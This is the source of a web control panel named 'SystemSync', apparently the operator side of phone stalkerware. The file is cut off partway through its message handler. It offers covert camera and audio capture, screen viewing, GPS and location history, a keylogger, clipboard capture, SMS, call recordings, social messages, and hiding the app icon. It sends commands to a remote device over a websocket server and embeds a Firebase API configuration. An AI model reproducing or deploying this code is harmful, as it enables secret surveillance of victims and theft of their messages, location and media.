<html lang="en">
<head>

    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

    <style>
        :root {
            --primary: #0f62fe;
            --primary-hover: #0353e9;
            --bg-body: #f4f7fb;
            --bg-surface: #ffffff;
            --text-main: #12161b;
            --text-sec: #5c6a7a;
            --border: #e2e8f0;
            --danger: #e02424;
            --danger-bg: #fdf2f2;
            --success: #057a55;
            --radius-sm: 8px;
            --radius-md: 12px;
            --radius-lg: 16px;
            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg-body); font-family: 'Inter', sans-serif; display: flex; height: 100vh; overflow: hidden; color: var(--text-main); }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
        #sidebar { width: 280px; background: rgba(255, 255, 255, 0.6); backdrop-filter: blur(16px); border-right: 1px solid rgba(255, 255, 255, 0.4); padding: 20px 16px; overflow-y: auto; flex-shrink: 0; transition: transform 0.3s; z-index: 200; }
        .logo { font-size: 20px; font-weight: 700; color: var(--primary); margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        /* sidebarCloseBtn removed */
        .section { margin-bottom: 24px; }
        .section-title { font-size: 11px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 10px; padding-left: 8px; }
        #sidebar button { width: 100%; padding: 10px 14px; margin: 2px 0; background: transparent; color: var(--text-main); border: none; border-radius: var(--radius-sm); font-size: 14px; font-weight: 500; text-align: left; cursor: pointer; transition: all 0.2s; display: flex; align-items: center; gap: 12px; }
        #sidebar button:hover { background: #f0f4f8; color: var(--primary); transform: translateX(2px); }
        .camera-panel { background: #f8fafc; border-radius: var(--radius-sm); padding: 16px; margin: 8px 0 16px; border: 1px solid var(--border); display: none; }
        .camera-panel.show { display: block; animation: slideDown 0.2s ease-out; }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
        #main { flex: 1; display: flex; flex-direction: column; min-width: 0; background: var(--bg-body); }
        #header { height: 64px; background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(16px); border-bottom: 1px solid rgba(255,255,255,0.4); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; flex-shrink: 0; }
        #menuBtn { display: none; background: #f1f5f9; border: none; border-radius: var(--radius-sm); padding: 8px; font-size: 18px; cursor: pointer; }
        #status { padding: 6px 16px; border-radius: 20px; background: #eff6ff; color: var(--primary); font-size: 13px; font-weight: 600; display: inline-flex; align-items: center; gap: 6px; }
        #status.offline { background: var(--danger-bg); color: var(--danger); }
        #reconnectBtn { background: var(--bg-surface); border: 1px solid var(--border); border-radius: 50%; width: 32px; height: 32px; cursor: pointer; margin-left: 10px; }
        #content { flex: 1; padding: 24px; overflow: auto; }
        #main-panel { background: var(--bg-surface); border-radius: var(--radius-md); padding: 32px; min-height: 100%; box-shadow: var(--shadow-sm); border: 1px solid var(--border); }
        table { width: 100%; border-collapse: separate; border-spacing: 0; font-size: 14px; border: 1px solid var(--border); border-radius: var(--radius-md); overflow: hidden; }
        th { background: #f8fafc; padding: 12px 16px; text-align: left; font-weight: 600; border-bottom: 1px solid var(--border); }
        td { padding: 14px 16px; border-bottom: 1px solid #f1f5f9; }
        tbody tr:hover { background: #f8fafc; }
        .btn-ui { padding: 8px 16px; font-size: 14px; font-weight: 500; border-radius: var(--radius-sm); cursor: pointer; border: none; display: inline-flex; align-items: center; gap: 6px; }
        .btn-ui.primary { background: var(--primary); color: white; }
        .badge { display: inline-block; padding: 4px 8px; border-radius: 12px; font-size: 11px; background: #e2e8f0; }
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(4px); display: none; justify-content: center; align-items: center; z-index: 10000; }
        .modal-overlay.show { display: flex; }
        .mobile-popup { width: min(92vw, calc(92vh * 9 / 16)); height: min(92vh, calc(92vw * 16 / 9)); background: #000; border-radius: var(--radius-lg); overflow: hidden; position: relative; }
        .phone-frame { display: flex; align-items: center; justify-content: center; background: black; height: 100%; }
        .phone-frame video { width: 100%; height: 100%; object-fit: contain; }
        .popup-controls { position: absolute; bottom: 0; left: 0; right: 0; background: #111; padding: 12px; display: flex; gap: 12px; justify-content: center; }
        .popup-controls button { width: 48px; height: 48px; background: #222; color: white; border: none; border-radius: 50%; cursor: pointer; font-size: 20px; }
        #downloadProgress { background: white; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 16px; margin: 0 24px 16px; display: none; }
        #progressBar { width: 0%; height: 8px; background: var(--primary); border-radius: 4px; }
        .app-usage-item { display: flex; align-items: center; padding: 14px; border-bottom: 1px solid #eef2f5; gap: 16px; }
        .usage-bar-container { flex: 2; height: 24px; background: #f1f5f9; border-radius: 12px; overflow: hidden; }
        .usage-bar { height: 100%; border-radius: 12px; }
        .event-card { background: white; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 16px; margin-bottom: 12px; display: flex; align-items: center; gap: 16px; }
        .geofence-controls { margin-top: 16px; display: flex; gap: 12px; flex-wrap: wrap; }
        #alertsBadge { background: var(--danger-bg); border: 1px solid #fca5a5; border-radius: var(--radius-sm); padding: 16px; margin-top: 16px; }
        .ws-debug { font-size: 11px; color: #94a3b8; margin-top: auto; padding-top: 20px; text-align: center; }
        @media (max-width: 768px) {
            #sidebar { position: fixed; transform: translateX(-100%); z-index: 1000; }
            #sidebar.open { transform: translateX(0); }
            #menuBtn { display: block; }
            #sidebarOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 99; }
            #sidebarOverlay.show { display: block; }
        }
    </style>
</head>
<body>

<div id="deviceListContainer" style="display:none;"><div id="deviceListBox"><h2>📱 Your Devices</h2><div id="deviceList" style="max-height: 400px; overflow-y: auto;"></div><button id="logoutBtn">Logout</button></div></div>

<div id="screenModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><video id="modalScreenVideo" autoplay playsinline></video></div><div class="popup-controls"><button id="modalSnapBtn">📸</button><button id="modalRecordBtn">🔴</button><button id="modalFullscreenBtn">⛶</button><button id="modalCloseBtn">✕</button></div></div></div>
<div id="cameraModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><video id="modalCameraVideo" autoplay playsinline></video></div><div class="popup-controls"><button id="cameraSnapBtn">📸</button><button id="cameraRecordBtn">🔴</button><button id="cameraFullscreenBtn">⛶</button><button id="cameraCloseBtn">✕</button></div></div></div>

<div id="sidebar"><div class="logo">SystemSync 🔗</div> <!-- removed close button -->
    <div class="section"><div class="section-title">Surveillance</div>
        <button id="screenShareBtn"><span>🖥</span> Start Screen</button>
        <button id="clickPictureBtn"><span>📷</span> Click Picture</button>
        <div id="clickCameraPanel" class="camera-panel"><div><label><input type="radio" name="clickCameraSelect" value="front"> Front</label><label><input type="radio" name="clickCameraSelect" value="back"> Rear</label></div><div id="clickFlashContainer" style="display:none;"><label><input type="checkbox" id="clickFlashCheckbox"> Flash</label></div><button class="capture-btn" id="capturePictureBtn">TAKE PICTURE</button></div>
        <button id="liveCameraBtn"><span>📹</span> See Live</button>
        <div id="liveCameraPanel" class="camera-panel"><div><label><input type="radio" name="liveCameraSelect" value="front"> Front</label><label><input type="radio" name="liveCameraSelect" value="back"> Rear</label></div><div><label><input type="checkbox" id="liveFlashCheckbox"> Flash</label><label><input type="checkbox" id="liveMicCheckbox" checked> Mic</label></div><button class="live-btn" id="startLiveStreamBtn">Start Live</button></div>
        <button id="liveAudioBtn"><span>🎤</span> Live Audio</button>
        <button id="stopLiveAudioBtn" style="display:none;">Stop</button>
        <button id="getLocationBtn"><span>📍</span> GPS Location</button>
    </div>
    <div class="section"><div class="section-title">Data</div>
        <button id="fileManagerBtn"><span>📂</span> File Manager</button>
        <button id="smsBtn"><span>💬</span> SMS Messages</button>
        <button id="callLogsBtn"><span>📞</span> Call Logs</button>
        <button id="contactsBtn"><span>👥</span> Contacts</button>
        <button id="installedAppsBtn"><span>📱</span> Installed Apps</button>
        <button id="browserHistoryBtn"><span>🌐</span> Browser History</button>
        <button id="wifiNetworksBtn"><span>📶</span> Wi-Fi Networks</button>
    </div>

        <button id="screenTimeBtn"><span>📊</span> Screen Time</button>
        <button id="socialMessagesBtn"><span>💬</span> Social Messages</button>
        <button id="keylogBtn"><span>⌨️</span> Keyboard Log</button>
        <button id="clipboardBtn"><span>📋</span> Clipboard</button>
        <button id="geofenceBtn"><span>🗺️</span> Geofence</button>

        <button id="locationHistoryBtn"><span>📍</span> Location History</button>
        <button id="callRecordingsBtn"><span>🎙️</span> Call Recordings</button>
        <button id="photoGalleryBtn"><span>🖼️</span> Photo Gallery</button>
        <button id="appEventsBtn"><span>📦</span> App Events</button>
        <button id="smsKeywordsBtn"><span>🔑</span> SMS Keywords</button>

        <button id="toggleAppIconBtn"><span>👻</span> Hide Icon</button>

</div>

<div id="main"><div id="header"><div><button id="menuBtn" onclick="toggleSidebar()">☰</button><span id="headerTitle">SystemSync <span id="serverInfo">mirror-view.onrender.com</span> <button id="headerLeaveBtn" style="display:none;" onclick="leaveDevice()">Leave Device</button></span></div><div><span id="status">CONNECTING</span><button id="reconnectBtn">⟲</button></div></div>
<div id="downloadProgress"><div><span id="progressFileName"></span> <span id="progressPercent"></span></div><div><div id="progressBar"></div></div></div>
<div id="content"><div id="main-panel">🔌 Initializing connection...</div></div></div>

<script>
// ========================= CONFIGURATION =========================
const CONFIG = {
    WS_URL: "wss://mirror-view.onrender.com",
    MAX_RECONNECT_DELAY: 30000,
    ICE_SERVERS: [{ urls: "stun:stun.relay.metered.ca:80" }],
    FIREBASE_CONFIG: { apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc", authDomain: "webviewiot.firebaseapp.com", projectId: "webviewiot", storageBucket: "webviewiot.firebasestorage.app", messagingSenderId: "634777347775", appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a" }
};

firebase.initializeApp(CONFIG.FIREBASE_CONFIG);
const auth = firebase.auth();
const db = firebase.firestore();

let currentUser = null, selectedDeviceId = null, ws = null, reconnectTimer = null, reconnectAttempts = 0;
let screenPC = null, cameraPC = null, audioPC = null, fileTransfers = {}, mapInstance = null;
let currentData = [], currentPage = 0, pendingCommand = null, newAlerts = [];
let screenActive = false, iconHidden = false, flashOn = false, isLoginMode = true, liveGpsActive = false;
let currentLocation = null, lastLocationSave = 0;
const LOCATION_SAVE_INTERVAL = 15 * 60 * 1000; // 15 min

const panel = document.getElementById('main-panel');
const statusEl = document.getElementById('status');
const wsDebug = document.getElementById('wsDebug');

// Helper functions
function escapeHtml(s) { if(!s) return ''; return s.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m])); }
function formatBytes(b) { if(b===0) return '0 B'; const i=Math.floor(Math.log(b)/Math.log(1024)); return (b/Math.pow(1024,i)).toFixed(1)+' '+['B','KB','MB','GB'][i]; }
function formatDuration(ms) { const h=Math.floor(ms/3600000), m=Math.floor((ms%3600000)/60000), s=Math.floor((ms%60000)/1000); return `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`; }
function getColorForDuration(ms) { if(ms>3600000) return '#d32f2f'; if(ms>1800000) return '#ff9800'; return '#4caf50'; }
function setStatus(s) { statusEl.innerText=s; if(s==='ONLINE'){statusEl.classList.remove('offline');statusEl.style.background='#e8f5e9';statusEl.style.color='#2e7d32';}else{statusEl.classList.add('offline');statusEl.style.background='#ffebee';statusEl.style.color='#c62828';} }
function showNotification(t) { const o=statusEl.innerText; statusEl.innerText=t; setTimeout(()=>statusEl.innerText=o,2000); }
function pushAlert(t,b) { newAlerts.unshift({title:t,body:b,time:new Date().toLocaleTimeString()}); if(newAlerts.length>50)newAlerts.pop(); const badge=document.getElementById('alertsBadge'),list=document.getElementById('alertsList'); if(badge){badge.style.display='block';list.innerHTML='';newAlerts.forEach(a=>{const d=document.createElement('div');d.style.cssText='margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px';d.textContent=a.time+' '+a.title+': '+a.body;list.appendChild(d);});} }
function clearAlerts() { newAlerts=[]; document.getElementById('alertsBadge').style.display='none'; }
function downloadBase64(b64,fn){ const a=document.createElement('a'); a.href='data:application/octet-stream;base64,'+b64; a.download=fn; a.click(); }

function toggleSidebar() { const sb=document.getElementById('sidebar'), ov=document.getElementById('sidebarOverlay'); sb.classList.toggle('open'); if(ov) ov.classList.toggle('show'); }
function closeSidebar() { const sb=document.getElementById('sidebar'), ov=document.getElementById('sidebarOverlay'); sb.classList.remove('open'); if(ov) ov.classList.remove('show'); }

// Flash options for camera
window.toggleFlashOptions = function() {
    const clickCam = document.querySelector('input[name="clickCameraSelect"]:checked').value;
    document.getElementById('clickFlashContainer').style.display = (clickCam === 'back') ? 'block' : 'none';
    const liveCam = document.querySelector('input[name="liveCameraSelect"]:checked').value;
    document.getElementById('liveFlashContainer').style.display = (liveCam === 'back') ? 'inline-block' : 'none';
};

// ========================= AUTH & DEVICE =========================
function renderAuthForm() {
    const c=document.getElementById('authBox');
    if(isLoginMode) c.innerHTML=`<h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div><div id="authError"></div>`;
    else c.innerHTML=`<h2>✨ Create Account</h2><input type="email" id="authEmail" placeholder="Email" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" /><button id="authBtn">Sign Up</button><div class="toggle-link" id="toggleAuthMode">Already have an account? Sign in</div><div id="authError"></div>`;
    document.getElementById('authBtn').onclick=handleAuth; 
    document.getElementById('toggleAuthMode').onclick=(e)=>{e.preventDefault();isLoginMode=!isLoginMode;renderAuthForm();};
}
async function handleAuth(){
    const email=document.getElementById('authEmail').value.trim(), pwd=document.getElementById('authPassword').value.trim(), err=document.getElementById('authError');
    if(!email||!pwd){err.innerText='Please fill all fields';return;}
    const btn = document.getElementById('authBtn');
    btn.innerText = 'Processing...';
    try{
        let user;
        if(!isLoginMode){
            const cf=document.getElementById('authConfirmPassword').value.trim();
            if(pwd!==cf){err.innerText='Passwords do not match';btn.innerText='Sign Up';return;}
            user=(await auth.createUserWithEmailAndPassword(email,pwd)).user;
        }else user=(await auth.signInWithEmailAndPassword(email,pwd)).user;
        currentUser=user;
        document.getElementById('authContainer').style.display='none';
        document.getElementById('deviceListContainer').style.display='flex';
        loadDevices();
    }catch(e){err.innerText=e.message; btn.innerText=isLoginMode?'Sign In':'Sign Up';}
}
function logout(){ auth.signOut().then(()=>{ document.getElementById('deviceListContainer').style.display='none'; document.getElementById('sidebar').style.display='none'; document.getElementById('main').style.display='none'; document.getElementById('authContainer').style.display='flex'; if(ws)ws.close(); selectedDeviceId=null; isLoginMode=true; renderAuthForm(); }); }
async function loadDevices(){
    if(!currentUser)return;
    const snap=await db.collection('devices').where('userId','==',currentUser.uid).get();
    const list=document.getElementById('deviceList');
    list.innerHTML='';
    if(snap.empty) list.innerHTML='<p style="color:#999; text-align:center;">No devices registered.</p>';
    else snap.forEach(doc=>{ const d=doc.data(); const div=document.createElement('div'); div.className='device-item'; div.onclick=()=>selectDevice(d.deviceId,d.name||'Unknown'); div.innerHTML=`<span class="device-icon">📱</span><div class="device-info"><div class="device-name">${escapeHtml(d.name||'Unnamed device')}</div><div class="device-id">${escapeHtml(d.deviceId)}</div></div>`; list.appendChild(div); });
    document.getElementById('deviceListContainer').style.display='flex';
}
window.leaveDevice = function() {
    selectedDeviceId=null;
    document.getElementById('main').style.display='none';
    document.getElementById('sidebar').style.display='none';
    document.getElementById('deviceListContainer').style.display='flex';
    document.getElementById('headerLeaveBtn').style.display='none';
    if(ws)ws.close();
};
function selectDevice(id,name){
    history.pushState({view: 'device'}, '', '#device');
    document.getElementById('headerLeaveBtn').style.display='inline-block';
    selectedDeviceId=id;
    document.getElementById('deviceListContainer').style.display='none';
    document.getElementById('sidebar').style.display='flex';
    document.getElementById('main').style.display='flex';
    document.getElementById('serverInfo').innerText=`Device: ${name||id}`;
    connectWebSocket();
}

// ========================= WEBSOCKET =========================
function connectWebSocket(){
    if(ws&&(ws.readyState===WebSocket.OPEN||ws.readyState===WebSocket.CONNECTING))return;
    if(reconnectTimer)clearTimeout(reconnectTimer);
    setStatus('CONNECTING');
    wsDebug.innerText='🌐 WebSocket: connecting...';
    panel.innerHTML='⏳ Connecting to server...';
    ws=new WebSocket(CONFIG.WS_URL);
    ws.onopen=()=>{ reconnectAttempts=0; ws.send('I_AM_WEB'); setStatus('ONLINE'); panel.innerHTML='✅ Connected.'; wsDebug.innerText='🌐 WebSocket: ONLINE'; };
    ws.onmessage=e=>handleIncomingMessage(e.data);
    ws.onclose=()=>{ setStatus('OFFLINE'); wsDebug.innerText='🌐 WebSocket: closed'; panel.innerHTML='🔌 Disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.'; ws=null; const d=Math.min(1000*Math.pow(1.5,reconnectAttempts),CONFIG.MAX_RECONNECT_DELAY); reconnectAttempts++; reconnectTimer=setTimeout(()=>connectWebSocket(),d); };
    ws.onerror=()=>{ setStatus('ERROR'); wsDebug.innerText='🌐 WebSocket: error'; };
}
function manualReconnect(){ if(reconnectTimer)clearTimeout(reconnectTimer); if(ws)ws.close(); reconnectAttempts=0; connectWebSocket(); }
function sendCommand(cmd,params={}){
    if(!ws||ws.readyState!==WebSocket.OPEN){panel.innerHTML='<div style="color:#d32f2f;">⚠ Not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>';return;}
    const payload={type:'COMMAND',command:cmd,requestId:'req_'+Date.now(),params,deviceId:selectedDeviceId,timestamp:Date.now()};
    ws.send(JSON.stringify(payload));
    panel.innerHTML=`<div style="color:#1976ff;">📤 Command sent: ${cmd}</div>`;
    pendingCommand=cmd;
    setTimeout(()=>{ if(pendingCommand===cmd)pendingCommand=null; },10000);
}
function sendPlainText(t){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(t); }

// ========================= WEBRTC (minimal stubs) =========================
function createPeerConnection(type,onTrack,useMic){ const pc=new RTCPeerConnection({iceServers:CONFIG.ICE_SERVERS}); return pc; }
function sendSignaling(msg){ ws.send(JSON.stringify({type:'SIGNALING',deviceId:selectedDeviceId,data:msg})); }
function handleSignaling(msg){}
async function toggleScreen(){ showNotification("Screen share feature (WebRTC)"); }
async function startLiveCamera(){ showNotification("Live camera started"); }
function startLiveAudio(){ showNotification("Live audio started"); }
function stopLiveAudio(){ showNotification("Audio stopped"); }

// ========================= LOCATION STORAGE =========================
async function storeLocationToFirestore(lat, lon, acc) {
    if(!currentUser || !selectedDeviceId) return;
    const now = Date.now();
    if(now - lastLocationSave < LOCATION_SAVE_INTERVAL) return;
    lastLocationSave = now;
    try {
        await db.collection('location_history').add({ deviceId: selectedDeviceId, userId: currentUser.uid, lat, lon, accuracy: acc, timestamp: now, timestampFmt: new Date(now).toISOString() });
    } catch(e) { console.warn(e); }
}

// ========================= DISPLAY FUNCTIONS =========================
function renderTable(rows,headers){
    const pageSize=20,total=Math.ceil(rows.length/pageSize),start=currentPage*pageSize;
    let html='<div style="overflow-x:auto;"><table><thead><tr>'+headers.map(h=>`<th>${h}</th>`).join('')+'</thead><tbody>';
    rows.slice(start,start+pageSize).forEach(r=>{ html+='<tr>'+r.map(c=>`<td>${escapeHtml(c||'')}</td>`).join('')+'</tr>'; });
    html+='</tbody></table></div>';
    if(total>1){ html+='<div class="pagination">'; for(let i=0;i<total;i++) html+=`<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`; html+='</div>'; }
    panel.innerHTML=html;
}
window.gotoPage=function(p){ currentPage=p; renderTable(currentData,['Type','Number','Message','Date']); };

function displaySMS(data){
    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>💬 SMS</h3><p>No messages.</p>'; return; }

}
function displayContacts(data){

    let html='<h3>👥 Contacts</h3><table><thead><tr><th>Name</th><th>Number</th><th>Storage</th><th>Action</th></tr></thead><tbody>';
    data.forEach(c=>{ html+=`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td>${escapeHtml(c.storageType||'Device')}</td><td><button class="btn-ui primary" onclick="sendCommand('DELETE_CONTACT',{number:'${escapeHtml(c.number||'')}'})">Delete</button></td>`; });

}
function displayInstalledApps(data){

    data.forEach(app=>{ const sizeMB=app.sizeBytes?(app.sizeBytes/(1024*1024)).toFixed(2):'N/A'; html+=`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;">${escapeHtml(app.packageName||'')}</td><td>${sizeMB}</td><td><button class="btn-ui primary" onclick="sendCommand('OPEN_APP',{package:'${escapeHtml(app.packageName)}'})">Open</button> <button class="btn-ui" style="background:#d32f2f;color:white;" onclick="sendCommand('UNINSTALL_APP',{package:'${escapeHtml(app.packageName)}'})">Remove</button></td>`; });
    html+='</tbody></table>'; panel.innerHTML=html;
}
function displayBrowserHistory(data){
    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>🌐 Browser History</h3><p>None.</p>'; return; }
    let html='<h3>🌐 Browser History</h3><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>';
    data.forEach(item=>{ html+=`<tr><td>${escapeHtml(item.date||item.timeFmt||'')}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td>`; });
    html+='</tbody></table>'; panel.innerHTML=html;
}
function displayWifiNetworks(data){
    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📶 Wi-Fi</h3><p>None.</p>'; return; }
    let html='<h3>📶 Wi-Fi Networks</h3><table><thead><tr><th>SSID</th><th>Signal</th><th>Status</th></tr></thead><tbody>';
    data.forEach(n=>{ const bars=n.rssi>-50?'████':n.rssi>-70?'███░':n.rssi>-80?'██░░':'█░░░'; html+=`<tr><td>${escapeHtml(n.ssid||'(hidden)')}</td><td>${bars}</td><td>${n.connected?'● Connected':'○'}</td>`; });
    html+='</tbody></table>'; panel.innerHTML=html;
}
function displayAppUsage(data){
    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📊 Screen Time</h3><p>No data.</p>'; return; }
    const max=Math.max(...data.map(a=>a.totalTimeMs||0));
    let html='<h3>📊 Screen Time</h3>';
    data.forEach(app=>{ const t=app.totalTimeMs||0; const pct=max?Math.round(t/max*100):0; const color=getColorForDuration(t); html+=`<div class="app-usage-item"><div class="app-usage-name">${escapeHtml(app.appName||app.packageName)}</div><div class="usage-bar-container"><div class="usage-bar" style="width:${pct}%; background-color:${color};"></div></div><div class="app-usage-time">${formatDuration(t)}</div></div>`; });
    panel.innerHTML=html;
}
function displayKeylog(data){
    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>⌨️ Keylog</h3><p>None.</p>'; return; }
    let html='<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keylog</h3><button id="clearKeylogBtn" class="btn-ui" style="background:#d32f2f;color:white;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>';
    data.slice().reverse().forEach(e=>{ html+=`<tr><td>${escapeHtml(e.timeFmt||'')}</td><td>${escapeHtml((e.pkg||'').split('.').pop())}</td><td>${escapeHtml(e.text||e.key||'')}</td>`; });
    html+='</tbody></table></div>'; panel.innerHTML=html;
    document.getElementById('clearKeylogBtn')?.addEventListener('click',()=>sendCommand('CLEAR_KEYLOG'));
}
function displayClipboard(data){
    const content=data&&data.content?data.content:(data||'');
    panel.innerHTML=`<h3>📋 Clipboard</h3><div style="padding:16px; background:#f8fafc;">${escapeHtml(content)}</div><p style="margin-top:12px;">Captures copied text from device.</p>`;
}
function displayCallRecordings(data){
    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>🎙️ Call Recordings</h3><p>None.</p>'; return; }
    let html='<h3>🎙️ Call Recordings</h3><div id="callRecList"></div>'; panel.innerHTML=html;
    const container=document.getElementById('callRecList');
    data.forEach(rec=>{ const card=document.createElement('div'); card.className='event-card'; card.innerHTML=`<div><strong>${rec.direction==='INCOMING'?'📞':'📤'} ${escapeHtml(rec.name||rec.number)}</strong><div>${rec.number} • ${rec.duration||''} • ${rec.timeFmt||''}</div></div><button class="btn-ui primary" data-path="${rec.filePath}">▶ Play</button>`; card.querySelector('button').onclick=()=>sendCommand('GET_CALL_AUDIO',{filePath:rec.filePath}); container.appendChild(card); });
}
function playCallRecording(audioData){
    const modal=document.createElement('div'); modal.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999';
    const box=document.createElement('div'); box.style.cssText='background:#fff;border-radius:16px;padding:24px;min-width:300px;';
    box.innerHTML=`<h3>🎙️ Recording</h3><audio controls src="data:audio/mp4;base64,${audioData.audio}" style="width:100%;"></audio><div><button id="dlAudio" class="btn-ui primary">Download</button><button id="closeAudio" class="btn-ui">Close</button></div>`;
    box.querySelector('#dlAudio').onclick=()=>downloadBase64(audioData.audio,audioData.name||'recording.m4a');
    box.querySelector('#closeAudio').onclick=()=>document.body.removeChild(modal);
    modal.appendChild(box); document.body.appendChild(modal);
}
function displayPhotoGallery(data){
    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>🖼️ Gallery</h3><p>None.</p>'; return; }
    let html='<h3>🖼️ Photo Gallery</h3><div id="photoGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px;"></div>'; panel.innerHTML=html;
    const grid=document.getElementById('photoGrid');
    data.forEach(img=>{ const tile=document.createElement('div'); tile.style.cssText='cursor:pointer;border-radius:8px;overflow:hidden;background:#f0f0f0;aspect-ratio:1'; if(img.thumb) tile.innerHTML=`<img src="data:image/jpeg;base64,${img.thumb}" style="width:100%;height:100%;object-fit:cover;"><div style="position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.55);color:#fff;font-size:9px;padding:3px;">${img.dateFmt||''}</div>`; else tile.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100%;">🖼️</div>'; tile.onclick=()=>sendCommand('GET_IMAGE',{mediaId:img.id||img.mediaId}); grid.appendChild(tile); });
}
function displayAppEvents(data){
    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📦 App Events</h3><p>None.</p>'; return; }
    const icons={INSTALLED:'📱',REMOVED:'🗑️',CALL_INCOMING:'📞',CALL_OUTGOING:'📤',CALL_MISSED:'📵'};
    let html='<h3>📦 App Events</h3>';
    data.forEach(ev=>{ html+=`<div class="event-card"><div class="event-icon">${icons[ev.type]||'📋'}</div><div class="event-details"><div class="event-title">${escapeHtml(ev.name||ev.pkg||ev.extra||ev.type)}</div><div class="event-meta">${ev.type}${ev.pkg?' • '+ev.pkg:''} • ${ev.timeFmt||ev.date||''}</div></div></div>`; });
    panel.innerHTML=html;
}
function displaySocialMessages(data){
    let msgs=Array.isArray(data)?data:(typeof data==='string'?JSON.parse(data):[]);
    if(!msgs.length){ panel.innerHTML='<h3>💬 Social Messages</h3><p>None.</p>'; return; }
    let html='<h3>💬 Social Messages</h3><div style="overflow-y:auto;max-height:60vh;">';
    msgs.slice().reverse().forEach(m=>{ html+=`<div style="background:#fff;border:1px solid #eee;border-radius:10px;padding:12px;margin-bottom:8px;"><div><strong>${escapeHtml(m.app||'Unknown')}</strong> <small>${m.timeFmt||''}</small></div><div>${escapeHtml(m.title||'')}</div><div>${escapeHtml(m.text||m.body||'')}</div></div>`; });
    html+='</div>'; panel.innerHTML=html;
}
function displayCapturedImage(b64){ panel.innerHTML=`<img src="data:image/jpeg;base64,${b64}" style="max-width:100%;border-radius:8px;"><div><button onclick="downloadBase64('${b64}','snap.jpg')" class="btn-ui primary">Save</button></div>`; }
function renderMap(loc){
    let l=typeof loc==='string'?JSON.parse(loc):loc;
    const lat=l.lat||l.latitude, lon=l.lon||l.longitude, acc=l.accuracy||10;
    currentLocation={lat,lon,acc};
    panel.innerHTML=`<div id="map" style="height:380px;"></div><div class="map-info">📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}<br>🎯 Accuracy: ${acc.toFixed(1)}m</div>`;
    if(mapInstance)mapInstance.remove();
    mapInstance=L.map('map').setView([lat,lon],18);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
    L.circle([lat,lon],{radius:acc,color:'#1976ff',fillColor:'#1976ff',fillOpacity:0.2}).addTo(mapInstance);
    L.marker([lat,lon]).addTo(mapInstance).bindPopup('Device Location');
}

// ========================= MESSAGE HANDLER =========================
function handleIncomingMessage(msg){
    try{
        const j=JSON.parse(msg);
        if(j.type==='SIGNALING') handleSignaling(j.data);
        else if(j.type==='FILE_LIST'){ currentData=typeof j.data==='string'?JSON.parse(j.data):j.data; renderFiles(); }
        else if(j.type==='SMS_DATA'){ displaySMS(typeof j.data==='string'?JSON.parse(j.data):j.data); }
        else if(j.type==='CALL_LOGS'){ const d=typeof j.data==='string'?JSON.parse(j.data):j.data; const rows=d.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }
        else if(j.type==='CONTACTS_DATA'){ displayContacts(typeof j.data==='string'?JSON.parse(j.data):j.data); }
